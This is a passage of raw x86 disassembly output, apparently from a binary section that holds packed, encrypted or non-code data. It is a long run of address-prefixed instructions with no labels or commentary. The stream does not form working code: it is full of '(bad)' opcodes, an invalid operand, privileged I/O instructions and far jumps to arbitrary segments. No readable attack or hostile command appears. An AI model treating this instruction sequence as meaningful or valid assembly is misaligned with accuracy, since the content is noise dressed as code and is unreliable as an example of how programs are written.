  415864:	mov    edx,0x4b6f3aa0
  415869:	ja     0x41580e
  41586b:	dec    ecx
  41586c:	or     BYTE PTR [ebx+0x26db2b2a],0xf8
  415873:	or     al,0x10
  415875:	call   0xad62b623
  41587a:	add    ebx,edx
  41587c:	aas    
  41587d:	in     eax,dx
  41587e:	xchg   esi,eax
  41587f:	iret   
  415880:	pop    ecx
  415881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415882:	(bad)  
  415883:	shl    BYTE PTR [ebp-0x1ae0953a],cl
  415889:	xor    dl,BYTE PTR [ebp-0x4fc7e71f]
  41588f:	test   DWORD PTR ds:0x8d9949e0,ecx
  415895:	and    dh,dl
  415897:	or     BYTE PTR [ecx],ah
  415899:	xchg   BYTE PTR [edx],dh
  41589b:	es gs std 
  41589e:	and    al,0x61
  4158a0:	mov    edi,0x3514dde6
  4158a5:	cli    
  4158a6:	jo     0x4158ee
  4158a8:	inc    eax
  4158a9:	ficomp DWORD PTR [esi+0x1c]
  4158ac:	push   edx
  4158ad:	inc    ebx
  4158ae:	adc    al,bh
  4158b0:	mov    ebx,0xf27ac863
  4158b5:	pop    edi
  4158b6:	sti    
  4158b7:	pop    esi
  4158b8:	pop    ds
  4158b9:	sbb    cl,ch
  4158bb:	ret    
  4158bc:	or     esi,DWORD PTR [edi-0x6bae057b]
  4158c2:	das    
  4158c3:	xor    edx,DWORD PTR [edi-0xb]
  4158c6:	mov    eax,0x3559e1f6
  4158cb:	or     eax,edx
  4158cd:	sub    ch,cl
  4158cf:	push   ss
  4158d0:	xlat   BYTE PTR ds:[ebx]
  4158d1:	push   ebx
  4158d2:	std    
  4158d3:	inc    ecx
  4158d4:	xlat   BYTE PTR ds:[ebx]
  4158d5:	ins    DWORD PTR es:[edi],dx
  4158d6:	in     eax,0x80
  4158d8:	mov    ebx,0x57487aed
  4158dd:	push   0x6afcfc57
  4158e2:	ins    BYTE PTR es:[edi],dx
  4158e3:	(bad)  [eax-0x78]
  4158e6:	repnz push esp
  4158e8:	inc    ebx
  4158e9:	data16 loope 0x41593c
  4158ec:	sbb    BYTE PTR [ebp-0x6f87eaeb],cl
  4158f2:	imul   dx,WORD PTR [edx+0x2851146a],0x39b8
  4158fb:	pop    ss
  4158fc:	inc    edi
  4158fd:	push   esi
  4158fe:	call   0x92e3:0x6395671e
  415905:	scas   eax,DWORD PTR es:[edi]
  415906:	pop    ds
  415907:	arpl   WORD PTR [esi],bp
  415909:	rcr    DWORD PTR [esi+0x4caaf873],0xff
  415910:	mov    DWORD PTR [ecx+edi*4],ebx
  415913:	test   eax,0xf939909f
  415918:	ss sar BYTE PTR es:[eax],1
  41591c:	test   al,0x7
  41591e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41591f:	lods   eax,DWORD PTR ds:[esi]
  415920:	clc    
  415921:	cmp    eax,0xd7e68b58
  415926:	aaa    
  415927:	or     eax,eax
  415929:	dec    eax
  41592a:	and    al,0x2b
  41592c:	arpl   WORD PTR [edi+0x2a17c982],sp
  415932:	ret    
  415933:	jns    0x41591e
  415935:	je     0x415930
  415937:	sub    eax,DWORD PTR [edx]
  415939:	cld    
  41593a:	sbb    bl,bh
  41593c:	inc    edx
  41593d:	dec    edx
  41593e:	adc    DWORD PTR [edi-0x24c25397],edi
  415944:	shl    DWORD PTR [esi],cl
  415946:	pop    eax
  415947:	lds    esi,FWORD PTR [ebx]
  415949:	sub    ah,BYTE PTR ds:0x21027c94
  41594f:	call   0xdf48:0xbfce7b8c
  415956:	hlt    
  415957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415958:	xchg   esi,eax
  415959:	outs   dx,DWORD PTR ds:[esi]
  41595a:	add    BYTE PTR [ecx-0x708bcd74],cl
  415960:	push   esi
  415961:	aas    
  415962:	fdiv   DWORD PTR [esi+0xb]
  415965:	cld    
  415966:	inc    ecx
  415967:	cmp    DWORD PTR [ebp-0x37b377c9],eax
  41596d:	icebp  
  41596e:	sar    ebp,1
  415970:	or     edx,DWORD PTR ds:0xf189b263
  415976:	cmp    esi,DWORD PTR [edx+eax*8]
  415979:	mov    ecx,0x4f92fa7c
  41597e:	mov    esi,0x6bfa21a3
  415983:	cmp    BYTE PTR [ebx+esi*4-0x35],al
  415987:	arpl   WORD PTR [eax-0x3be9bea4],si
  41598d:	in     al,0xcf
  41598f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415990:	fidivr WORD PTR [eax-0x600c5937]
  415996:	push   0xffffffcc
  415998:	sbb    DWORD PTR [ebx-0x1e316e1b],ecx
  41599e:	out    0xcd,eax
  4159a0:	push   edx
  4159a1:	pop    ebp
  4159a2:	cmc    
  4159a3:	sbb    cl,BYTE PTR [eax-0x6d]
  4159a6:	cmp    DWORD PTR [eax-0x79],edx
  4159a9:	or     eax,0x6aa7ed72
  4159ae:	gs call 0x78ac:0xaf1e76c
  4159b6:	push   ds
  4159b7:	xor    BYTE PTR [ebp+0x64eafe82],dl
  4159bd:	rcr    DWORD PTR [edi+0x67efbb0],cl
  4159c3:	pop    edx
  4159c4:	or     eax,0xb8f5c0d8
  4159c9:	shr    DWORD PTR [esi],0x94
  4159cc:	jge    0x415986
  4159ce:	add    DWORD PTR [ebx-0x469f787c],0x8856842e
  4159d8:	loope  0x4159c5
  4159da:	mov    ds:0x765577a6,al
  4159df:	jp     0x4159fc
  4159e1:	push   es
  4159e2:	imul   BYTE PTR [edi+0x3e]
  4159e5:	aad    0x86
  4159e7:	in     al,0x6d
  4159e9:	in     eax,0xc1
  4159eb:	push   0xffffff86
  4159ed:	stos   BYTE PTR es:[edi],al
  4159ee:	push   edx
  4159ef:	mov    ch,0xef
  4159f1:	or     al,0xe8
  4159f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159f4:	(bad)  
  4159f5:	sub    bh,BYTE PTR [ecx]
  4159f7:	mov    BYTE PTR gs:[ebx+0x6d80eff7],bh
  4159fe:	mov    eax,ds:0xd940a6d4
  415a03:	add    BYTE PTR [edx-0x225d9a13],0x0
  415a0a:	lock mov ecx,0x8fed7c29
  415a10:	xor    eax,0x3ee0d2dd
  415a15:	sbb    al,0xfb
  415a17:	cmc    
  415a18:	push   eax
  415a19:	into   
  415a1a:	ret    0x7748
  415a1d:	stos   BYTE PTR es:[edi],al
  415a1e:	dec    esp
  415a1f:	loopne 0x415a05
  415a21:	in     al,dx
  415a22:	mov    bh,0x48
  415a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a25:	popf   
  415a26:	popa   
  415a27:	add    edi,eax
  415a29:	push   eax
  415a2a:	push   cs
  415a2b:	inc    edi
  415a2c:	jp     0x415a49
  415a2e:	std    
  415a2f:	mov    edx,fs
  415a31:	(bad)  
  415a32:	pop    eax
  415a33:	adc    ebx,eax
  415a35:	popf   
  415a36:	imul   edi,DWORD PTR [ecx],0x309c7f14
  415a3c:	fstp   QWORD PTR [ebx+0x3e]
  415a3f:	enter  0xd03b,0xc2
  415a43:	fcom   QWORD PTR [edi-0x71510f5]
  415a49:	jmp    FWORD PTR [ecx]
  415a4b:	loop   0x4159dc
  415a4d:	dec    esp
  415a4e:	lds    ecx,FWORD PTR [edi+0x4a]
  415a51:	pop    edi
  415a52:	sub    al,BYTE PTR [eax+0x2]
  415a55:	call   0x9742:0x87e8cf7a
  415a5c:	mov    bl,BYTE PTR [ecx]
  415a5e:	das    
  415a5f:	xor    ebx,esi
  415a61:	call   0xaede:0xd3139045
  415a68:	dec    ebx
  415a69:	mov    eax,0xb5933d64
  415a6e:	(bad)  
  415a6f:	mov    al,0xf9
  415a71:	pop    ecx
  415a72:	cmc    
  415a73:	xchg   BYTE PTR [ebp+0x60399442],dh
  415a79:	and    BYTE PTR [ecx+0x687c851],0xef
  415a80:	sar    DWORD PTR [edi+0x7fa03750],1
  415a86:	jmp    0x9dfe:0x1c4099f4
  415a8d:	mov    esp,esp
  415a8f:	cli    
  415a90:	mov    ch,BYTE PTR [ecx-0xefc9782]
  415a96:	mov    bh,0x7d
  415a98:	ret    
  415a99:	and    esi,DWORD PTR [esi+0x37]
  415a9c:	call   0xa5a313ac
  415aa1:	data16 sbb BYTE PTR [eax+0x34],cl
  415aa5:	add    DWORD PTR [edx+0x52950c26],ecx
  415aab:	dec    edi
  415aac:	(bad)  
  415aad:	mov    bl,0x12
  415aaf:	cmp    al,0xfe
  415ab1:	mov    edi,0xf25da104
  415ab6:	pop    ebp
  415ab7:	std    
  415ab8:	adc    eax,0xbb39bead
  415abd:	loope  0x415aba
  415abf:	int    0xc5
  415ac1:	pop    ebp
  415ac2:	shl    DWORD PTR [eax-0x78],cl
  415ac5:	jns    0x415ab0
  415ac7:	(bad)  
  415ac8:	cmp    DWORD PTR [eax-0x39],esi
  415acb:	adc    eax,0x769e8a21
  415ad0:	scas   eax,DWORD PTR es:[edi]
  415ad1:	mov    ebp,0x87379200
  415ad6:	adc    DWORD PTR [eax+esi*8-0x70],eax
  415ada:	dec    esp
  415adb:	xchg   ebp,eax
  415adc:	jno    0x415b43
  415ade:	into   
  415adf:	clc    
  415ae0:	stos   BYTE PTR es:[edi],al
  415ae1:	xlat   BYTE PTR ds:[ebx]
  415ae2:	fwait
  415ae3:	xor    DWORD PTR [esi+edi*8+0x27],edx
  415ae7:	lea    esi,[eax-0x86f7f83]
  415aed:	outs   dx,DWORD PTR ds:[esi]
  415aee:	xchg   ebp,eax
  415aef:	mov    BYTE PTR [edi],bh
  415af1:	loop   0x415ace
  415af3:	jns    0x415b3f
  415af5:	shl    ebx,0x81
  415af8:	sbb    al,0x62
  415afa:	out    dx,al
  415afb:	jae    0x415aa3
  415afd:	mov    esp,0xad272903
  415b02:	mov    dh,0xcc
  415b04:	and    eax,0xae305631
  415b09:	adc    edi,esp
  415b0b:	enter  0xb54b,0x58
  415b0f:	outs   dx,DWORD PTR ds:[esi]
  415b11:	xor    ecx,DWORD PTR [esi+ebx*8+0x47]
  415b15:	cmp    al,0xe9
  415b17:	aad    0x13
  415b19:	xor    BYTE PTR [edx-0x73],al
  415b1c:	push   0x13b885b8
  415b21:	jge    0x415aba
  415b23:	jge    0x415b39
  415b25:	jp     0x415b8f
  415b27:	mov    esi,fs
  415b29:	ret    
  415b2a:	push   es
  415b2b:	dec    esp
  415b2c:	jl     0x415b82
  415b2e:	das    
  415b2f:	ret    0xbf46
  415b32:	mov    ah,0xb5
  415b34:	data16 cmc 
  415b36:	xor    al,BYTE PTR [esi+0x68]
  415b39:	sar    BYTE PTR [edx+0x1fb8eaad],0x9
  415b40:	or     ebp,DWORD PTR [edx*4-0x5a519948]
  415b47:	lods   eax,DWORD PTR ds:[esi]
  415b48:	sahf   
  415b49:	jo     0x415b85
  415b4b:	mov    eax,ds:0x2d0852c7
  415b50:	cmp    DWORD PTR [esi],esp
  415b52:	pop    ss
  415b53:	cld    
  415b54:	mov    ds:0x3795ca0f,al
  415b59:	cs jnp 0x415afc
  415b5c:	adc    esp,DWORD PTR [edx]
  415b5e:	inc    esp
  415b5f:	in     al,0xe7
  415b61:	push   edi
  415b62:	xchg   esp,eax
  415b63:	nop
  415b64:	out    dx,eax
  415b65:	pop    ebp
  415b66:	inc    eax
  415b67:	xchg   DWORD PTR [esi-0x7171dd87],ebx
  415b6d:	mov    ecx,0xc92ab981
  415b72:	loopne 0x415bab
  415b74:	cli    
  415b75:	adc    DWORD PTR [ebx-0x5394b44c],esp
  415b7b:	lods   eax,DWORD PTR ds:[esi]
  415b7c:	dec    edi
  415b7d:	mov    edx,0x312dd5b5
  415b82:	js     0x415b85
  415b84:	push   0x4f3ad03
  415b89:	push   ebx
  415b8a:	outs   dx,DWORD PTR ds:[esi]
  415b8b:	xor    al,BYTE PTR [edi+0x43]
  415b8e:	(bad)  
  415b8f:	push   esi
  415b90:	sub    BYTE PTR [ebp+0x17],bh
  415b93:	es hlt 
  415b95:	sbb    esp,DWORD PTR [eax+esi*2]
  415b98:	in     eax,0xfb
  415b9a:	cdq    
  415b9b:	or     DWORD PTR [ebp+0x2796bcb6],esp
  415ba1:	mov    eax,ds:0x59df90f8
  415ba6:	clc    
  415ba7:	mov    ebp,0xe81b6c72
  415bac:	push   0x855fe2db
  415bb1:	mov    bh,0x6a
  415bb3:	adc    DWORD PTR [eax-0x6f],ebp
  415bb6:	xchg   ax,ax
  415bb9:	add    BYTE PTR [edx],ch
  415bbb:	xchg   edi,eax
  415bbc:	out    0xd0,al
  415bbe:	fwait
  415bbf:	mov    edx,0x30af557e
  415bc4:	ficom  DWORD PTR [ebx+0x3e]
  415bc7:	mov    ch,0x9d
  415bc9:	mov    edx,ebx
  415bcb:	inc    esp
  415bcc:	jmp    0x6292:0x7c5a3228
  415bd3:	xchg   esp,eax
  415bd4:	inc    edx
  415bd5:	dec    eax
  415bd6:	loop   0x415ba8
  415bd8:	push   edi
  415bd9:	push   0xace0ee8c
  415bde:	(bad)  
  415bdf:	out    dx,al
  415be0:	test   BYTE PTR [ecx+0x31],bh
  415be3:	inc    esi
  415be4:	sub    bx,WORD PTR [ebp-0x72]
  415be8:	push   ecx
  415be9:	push   edi
  415bea:	adc    eax,0xcb0f9824
  415bef:	outs   dx,DWORD PTR ds:[esi]
  415bf0:	push   esp
  415bf1:	xor    al,0x7e
  415bf3:	outs   dx,DWORD PTR ds:[esi]
  415bf4:	je     0x415c62
  415bf6:	pushf  
  415bf7:	add    eax,0xa0840ad
  415bfc:	aam    0xc
  415bfe:	aaa    
  415bff:	das    
  415c00:	nop
  415c01:	or     al,0xaf
  415c03:	dec    ebp
  415c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c05:	sbb    dl,BYTE PTR [ecx+0x3bbd3890]
  415c0b:	xor    dl,BYTE PTR [edi+0x21]
  415c0e:	pop    ebx
  415c0f:	jnp    0x415bce
  415c11:	in     al,dx
  415c12:	or     ebx,eax
  415c14:	or     BYTE PTR [ecx+0x250e678a],ch
  415c1a:	sbb    eax,0xed0f265e
  415c1f:	jmp    0xa287:0xbbf53a1
  415c26:	sub    bl,BYTE PTR [edi+0x44]
  415c29:	ins    DWORD PTR es:[edi],dx
  415c2a:	xor    ebp,edi
  415c2c:	in     eax,0x83
  415c2e:	std    
  415c2f:	cwde   
  415c30:	sub    al,0x87
  415c32:	neg    BYTE PTR [eax+0x20bfe89a]
  415c38:	out    0xcb,eax
  415c3a:	ret    
  415c3b:	push   eax
  415c3c:	aad    0xbd
  415c3e:	ja     0x415c31
  415c40:	(bad)  
  415c41:	jae    0x415c99
  415c43:	jmp    0xb1f20e04
  415c48:	das    
  415c49:	clc    
  415c4a:	test   DWORD PTR [edi],0xbbd1fb5
  415c50:	pusha  
  415c51:	mov    edi,DWORD PTR [esi]
  415c53:	jno    0x415bf4
  415c55:	cmp    al,0x9e
  415c57:	cmp    eax,0xd0e46170
  415c5c:	jmp    0x415c2b
  415c5e:	loope  0x415c2e
  415c60:	cmp    eax,0x834c3f79
  415c65:	scas   eax,DWORD PTR es:[edi]
  415c66:	xor    eax,0xc5848d54
  415c6b:	cli    
  415c6c:	gs sar eax,0x5a
  415c70:	mov    dl,0xb8
  415c72:	sub    al,0xfe
  415c74:	adc    ecx,DWORD PTR [eax-0x22]
  415c77:	push   ds
  415c78:	ret    
  415c79:	jne    0x415c02
  415c7b:	iret   
  415c7c:	hlt    
  415c7d:	push   edi
  415c7e:	(bad)  
  415c7f:	pusha  
  415c80:	jmp    0x46452981
  415c85:	lds    esi,FWORD PTR [ebp-0x7d]
  415c88:	xchg   esp,eax
  415c89:	loop   0x415cef
  415c8b:	cmp    BYTE PTR [edi],0x3e
  415c8e:	dec    esi
  415c8f:	sub    edx,DWORD PTR [ebp-0x19]
  415c92:	and    DWORD PTR [ecx-0x2e],ebx
  415c95:	mov    esi,0x1618933f
  415c9a:	jno    0x415cfe
  415c9c:	(bad)  
  415c9e:	(bad)  
  415c9f:	push   ds
  415ca0:	cld    
  415ca1:	sub    ah,BYTE PTR [eax]
  415ca3:	cdq    
  415ca4:	(bad)  
  415ca5:	xor    al,0x5a
  415ca7:	sbb    edi,ecx
  415ca9:	out    0x89,eax
  415cab:	mov    ebp,edx
  415cad:	adc    BYTE PTR [esi+0x6d],dh
  415cb0:	push   esi
  415cb1:	mov    ebp,0x23b8f9ce
  415cb6:	or     al,0x7c
  415cb8:	or     BYTE PTR [edx+0x47],bl
  415cbb:	mov    cl,0xf9
  415cbd:	mov    WORD PTR [esp+esi*2+0x2526d1e5],es
  415cc4:	mov    ecx,0xa320e9bb
  415cc9:	loopne 0x415d37
  415ccb:	sbb    al,0x86
  415ccd:	dec    ebx
  415cce:	pop    ss
  415ccf:	cld    
  415cd0:	pop    ss
  415cd1:	ins    DWORD PTR es:[edi],dx
  415cd2:	mov    bh,BYTE PTR [ebx+0x5c02328e]
  415cd8:	pop    ebx
  415cd9:	pop    edx
  415cda:	xor    eax,0xd2f4170
  415cdf:	(bad)  [edx-0x4a80007c]
  415ce5:	push   cs
  415ce6:	sub    esi,DWORD PTR [ecx]
  415ce8:	sbb    ecx,DWORD PTR [edi-0x6c]
  415ceb:	pop    DWORD PTR [ebp-0x53]
  415cee:	js     0x415cb3
  415cf0:	jge    0x415d18
  415cf2:	inc    ecx
  415cf3:	mov    dh,0xaf
  415cf5:	fwait
  415cf6:	popa   
  415cf7:	in     eax,dx
  415cf8:	jae    0x415cd4
  415cfa:	mov    edx,ebp
  415cfc:	enter  0x4659,0x63
  415d00:	jp     0x415cbd
  415d02:	xor    BYTE PTR [edi],0x9d
  415d05:	adc    ebx,DWORD PTR [eax+ebp*8-0x7d]
  415d09:	push   es
  415d0a:	stc    
  415d0b:	adc    eax,DWORD PTR [esi]
  415d0d:	iret   
  415d0e:	fisub  WORD PTR [eax+0x784f2cf]
  415d14:	cwde   
  415d15:	or     al,0x60
  415d17:	mov    ecx,0xd234f41c
  415d1c:	es mov eax,0x745c736e
  415d22:	std    
  415d23:	xchg   ebp,eax
  415d24:	and    eax,DWORD PTR [edx+0x29eb15aa]
  415d2a:	into   
  415d2b:	(bad)  
  415d2c:	cld    
  415d2d:	add    ah,BYTE PTR [ebx+0x4]
  415d30:	iret   
  415d31:	aam    0x5d
  415d33:	push   esp
  415d34:	push   cs
  415d35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d36:	add    ecx,DWORD PTR [edi+eax*1+0x71]
  415d3a:	jmp    0x795b8f84
  415d3f:	ja     0x415cdc
  415d41:	(bad)  
  415d42:	dec    edi
  415d43:	mov    dl,0x2c
  415d45:	pop    ds
  415d46:	xor    BYTE PTR [ebp-0x1c],0xfa
  415d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d4b:	(bad)  
  415d4c:	lds    edx,FWORD PTR [ebp-0x55570032]
  415d52:	adc    eax,0xde3cfef3
  415d57:	mov    edx,0xf60aa088
  415d5c:	sub    BYTE PTR [eax+ebx*1+0x161704ec],cl
  415d63:	inc    edx
  415d65:	pop    ebp
  415d66:	push   0xffffffb3
  415d68:	or     al,0xf2
  415d6a:	das    
  415d6b:	outs   dx,BYTE PTR ds:[esi]
  415d6c:	xchg   ebx,eax
  415d6d:	ja     0x415da2
  415d6f:	test   BYTE PTR [eax-0x769af9c],ch
  415d75:	(bad)  
  415d76:	cld    
  415d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d78:	in     al,dx
  415d79:	jecxz  0x415de1
  415d7b:	mov    esi,0xfaca4c64
  415d80:	ficom  DWORD PTR [eax+0x7be59f2a]
  415d86:	push   esp
  415d87:	out    dx,al
  415d88:	mov    gs,WORD PTR [eax*2+0x3f755de3]
  415d8f:	and    eax,0x8b7a7c2c
  415d94:	dec    edx
  415d95:	imul   edx,ecx,0x44
  415d98:	test   al,0x21
  415d9a:	pop    edx
  415d9b:	fld    TBYTE PTR [ebx]
  415d9d:	cmp    BYTE PTR [ecx],dl
  415d9f:	inc    edx
  415da0:	sub    dl,BYTE PTR [esi+eax*1-0x33]
  415da4:	retf   0x8f48
  415da7:	call   0xc47a0f9c
  415dac:	outs   dx,DWORD PTR ds:[esi]
  415dad:	mov    esp,0x38772315
  415db2:	or     DWORD PTR [ebx+0x47],ebx
  415db5:	ss sbb edx,esi
  415db8:	test   dh,bl
  415dba:	add    eax,0x97edd65c
  415dbf:	das    
  415dc0:	jecxz  0x415e21
  415dc2:	cmp    ecx,eax
  415dc4:	sbb    eax,0x79dbf7a3
  415dc9:	add    al,BYTE PTR [eax-0xba8a88]
  415dcf:	push   ds
  415dd0:	xor    esp,DWORD PTR [ebx+ebp*2-0x67f22dde]
  415dd7:	dec    eax
  415dd8:	sub    dh,BYTE PTR [eax+0x36ed0b7f]
  415dde:	aam    0xc2
  415de0:	pop    edx
  415de1:	inc    eax
  415de2:	test   al,0xad
  415de4:	test   al,0x65
  415de6:	jl     0x415dd5
  415de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415de9:	mov    DWORD PTR [edi],0xb4f3e3c3
  415def:	or     BYTE PTR [esi],al
  415df1:	fwait
  415df2:	shl    DWORD PTR ds:0x48702cb0,1
  415df8:	xor    DWORD PTR [esi],ecx
  415dfa:	push   edi
  415dfb:	pop    ebx
  415dfc:	test   BYTE PTR [esp+ebx*1+0x12],ah
  415e00:	and    ebx,DWORD PTR [ecx-0x55978b39]
  415e06:	xor    ch,BYTE PTR [ebp-0xf5ab332]
  415e0c:	add    al,0x1e
  415e0e:	lea    ebp,[edx+0x38]
  415e11:	retf   
  415e12:	xchg   BYTE PTR [esi-0x31838e96],bl
  415e18:	jo     0x415e3c
  415e1a:	add    DWORD PTR [edx-0x1],ebx
  415e1d:	jmp    0x622a:0x931f8de2
  415e24:	ja     0x415e52
  415e26:	adc    dl,al
  415e28:	jne    0x415e82
  415e2a:	repnz ss inc eax
  415e2d:	sub    esi,DWORD PTR [ebx-0x12]
  415e30:	int    0x87
  415e32:	lds    edi,FWORD PTR [ecx]
  415e34:	int    0x86
  415e36:	aam    0x48
  415e38:	jo     0x415e0d
  415e3a:	fdiv   QWORD PTR [ebp+ebx*2-0x2ec64165]
  415e42:	jae    0x415e3b
  415e44:	xor    DWORD PTR [ebp+0x471a6bd1],ebp
  415e4a:	add    BYTE PTR [edi+ebx*1-0x56ecd7f0],0x2f
  415e52:	pop    ebp
  415e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e54:	js     0x415e74
  415e56:	pop    ds
  415e57:	adc    DWORD PTR [esp+ecx*1],ebx
  415e5a:	pop    ebx
  415e5b:	ja     0x415ea4
  415e5d:	(bad)
  415e60:	jns    0x415ed9
  415e62:	lods   al,BYTE PTR ds:[esi]
  415e63:	dec    edi
  415e64:	cli    
  415e65:	cs icebp 
  415e67:	ss fdivp st(3),st
  415e6a:	lds    edx,FWORD PTR [edx-0x7ac2b5bb]
  415e70:	rcr    edx,cl
  415e72:	and    dh,BYTE PTR [ecx-0x9d71707]
  415e78:	idiv   BYTE PTR [eax-0x65]
  415e7b:	les    ecx,FWORD PTR [edi+eax*1+0x59ad8e38]
  415e82:	xchg   edi,eax
  415e83:	cmp    DWORD PTR [ebx+ebp*4+0x2d],edx
  415e87:	int3   
  415e88:	fldcw  WORD PTR [edx-0x7bbaff41]
  415e8e:	push   ss
  415e8f:	push   ds
  415e90:	aaa    
  415e91:	call   DWORD PTR [edi-0x6cf79b92]
  415e97:	dec    edx
  415e98:	test   BYTE PTR [esi+ecx*8],cl
  415e9b:	mov    eax,ds:0xe7cf10cd
  415ea0:	shr    DWORD PTR [ecx+ebp*1],1
  415ea3:	stos   DWORD PTR es:[edi],eax
  415ea4:	pop    edx
  415ea5:	cmc    
  415ea6:	xor    dh,bl
  415ea8:	pop    ebp
  415ea9:	aad    0x69
  415eab:	sbb    esi,0x2c12d7e
  415eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eb2:	xchg   ebp,eax
  415eb3:	imul   edx,DWORD PTR [edx+0x73],0xea713052
  415eba:	push   ecx
  415ebb:	xor    DWORD PTR [eax-0x6c],ecx
  415ebe:	pusha  
  415ebf:	jmp    0xf08fd977
  415ec4:	xchg   ebx,eax
  415ec5:	test   bl,ch
  415ec7:	int    0x26
  415ec9:	and    edi,esi
  415ecb:	push   es
  415ecc:	add    eax,0x3e1eb214
  415ed1:	(bad)  
  415ed2:	lods   eax,DWORD PTR ds:[esi]
  415ed3:	rcl    BYTE PTR [ebp-0x45c1a375],0xde
  415eda:	fdivr  QWORD PTR [esi+0x5]
  415edd:	or     ch,bh
  415edf:	(bad)  
  415ee0:	dec    DWORD PTR [edx]
  415ee2:	(bad)  
  415ee4:	push   cs
  415ee5:	loopne 0x415f0d
  415ee7:	adc    ecx,ebx
  415ee9:	add    eax,0x67492355
  415eee:	add    eax,0x38d4e1f8
  415ef3:	jmp    0x10cc:0x8b7fdc71
  415efa:	neg    al
  415efc:	call   0x9087:0xdb985e4
  415f03:	add    DWORD PTR [eax],ebx
  415f05:	std    
  415f06:	retf   0xaedd
  415f09:	dec    edx
  415f0a:	mov    BYTE PTR [edi],0x96
  415f0d:	std    
  415f0e:	fs add al,0x80
  415f11:	test   al,0xb2
  415f13:	out    0x5c,al
  415f15:	jmp    DWORD PTR [ebx+0x2c400841]
  415f1b:	repz fwait
  415f1d:	cmp    ah,BYTE PTR [ecx-0x4a]
  415f20:	adc    DWORD PTR [edi-0x24],esp
  415f23:	add    DWORD PTR [esi+edi*1-0x5d],ebp
  415f27:	mov    cl,0xaf
  415f29:	sbb    BYTE PTR [esi],0xc9
  415f2c:	mov    ds:0xfd5f4e85,al
  415f31:	call   0xf998:0x7a59f062
  415f38:	shl    DWORD PTR [edx+0x71d7bc63],0x51
  415f3f:	shl    BYTE PTR [ebx-0x4e],1
  415f42:	inc    edx
  415f43:	pop    es
  415f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f45:	cmp    DWORD PTR [eax-0x86cc0f1],ebp
  415f4b:	mov    DWORD PTR [esi-0xd],esi
  415f4e:	and    bh,0xd0
  415f51:	ja     0x415ef0
  415f53:	push   ebp
  415f54:	jl     0x415faa
  415f56:	push   edi
  415f57:	mov    BYTE PTR [esi-0x20],bh
  415f5a:	xchg   edx,eax
  415f5b:	mov    BYTE PTR [eax-0x517683d6],dh
  415f61:	lods   eax,DWORD PTR ds:[esi]
  415f62:	sbb    eax,0x6baea393
  415f67:	and    eax,0xed03617f
  415f6c:	pop    eax
  415f6d:	jne    0x415f73
  415f6f:	sub    BYTE PTR [edi],al
  415f71:	loopne 0x415f0f
  415f73:	mov    ds:0x1d6ffb30,al
  415f78:	aad    0x81
  415f7a:	es xchg ebx,eax
  415f7c:	pop    edi
  415f7d:	mov    DWORD PTR [edi+edi*1-0xb],esi
  415f81:	sbb    DWORD PTR [edx+ecx*1],edx
  415f84:	jo     0x415fd4
  415f86:	sub    DWORD PTR [ebx+0x13031336],edi
  415f8c:	jg     0x415f8a
  415f8e:	sti    
  415f8f:	lods   eax,DWORD PTR ds:[esi]
  415f90:	dec    ecx
  415f91:	retf   0xbc69
  415f94:	fadd   QWORD PTR [ecx+0xc1bb901]
  415f9a:	and    ecx,DWORD PTR [edi]
  415f9c:	mov    al,ds:0x286fb266
  415fa1:	ja     0x415f8f
  415fa3:	fnstenv [edi-0x7ac260b1]
  415fa9:	pop    edi
  415faa:	clc    
  415fab:	mov    gs:0xe9ba0385,al
  415fb1:	or     DWORD PTR [esi+0x59421ff5],0xf3610805
  415fbb:	sub    DWORD PTR ds:0xfe5e3ab,eax
  415fc1:	sub    DWORD PTR [ebx-0x1a],edx
  415fc4:	ins    BYTE PTR es:[edi],dx
  415fc5:	sti    
  415fc6:	push   esi
  415fc7:	retf   0x4568
  415fca:	fst    DWORD PTR [eax]
  415fcc:	into   
  415fcd:	sbb    bh,dh
  415fcf:	pop    esp
  415fd0:	cmp    eax,0xa718a591
  415fd5:	xchg   ecx,eax
  415fd6:	fist   DWORD PTR [edx-0x46]
  415fd9:	and    BYTE PTR [edi+0x21],al
  415fdc:	jg     0x415fdc
  415fde:	mov    bh,0x5f
  415fe0:	clc    
  415fe1:	xchg   ebp,eax
  415fe2:	fwait
  415fe3:	ret    0xc7ec
  415fe6:	(bad)  
  415fe7:	or     dl,BYTE PTR [ebx]
  415fe9:	pop    ebp
  415fea:	cdq    
  415feb:	fstp   TBYTE PTR [esi]
  415fed:	mov    ecx,ebp
  415fef:	push   ebx
  415ff0:	fbstp  TBYTE PTR [edi]
  415ff2:	popf   
  415ff3:	or     eax,0xcec31013
  415ff8:	inc    ebx
  415ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ffa:	mov    ?,esp
  415ffc:	xor    BYTE PTR [ecx+eax*8+0x2fa412ca],bh
  416003:	bound  esi,QWORD PTR [edx]
  416005:	dec    eax
  416006:	dec    edi
  416007:	adc    DWORD PTR [edi],eax
  416009:	je     0x415ffc
  41600b:	fst    DWORD PTR [ecx-0x5fed1f31]
  416011:	push   0xcfd42d99
  416016:	aam    0x94
  416018:	rol    BYTE PTR [esi],cl
  41601a:	sbb    DWORD PTR [esi],esi
  41601c:	(bad)  
  41601d:	out    0xe2,eax
  41601f:	rcr    BYTE PTR [eax+0x23],1
  416022:	cmp    al,0x12
  416024:	push   DWORD PTR [esi]
  416026:	add    ah,dl
  416028:	push   cs
  416029:	and    ah,BYTE PTR [esi-0x20]
  41602c:	xor    esi,DWORD PTR [ecx-0x51]
  41602f:	cmp    BYTE PTR [esi+ebp*4],dh
  416032:	loopne 0x41608c
  416034:	ds jmp 0x471d:0x7ea7d5c1
  41603c:	addr16 into 
  41603e:	dec    eax
  41603f:	aaa    
  416040:	xchg   edx,eax
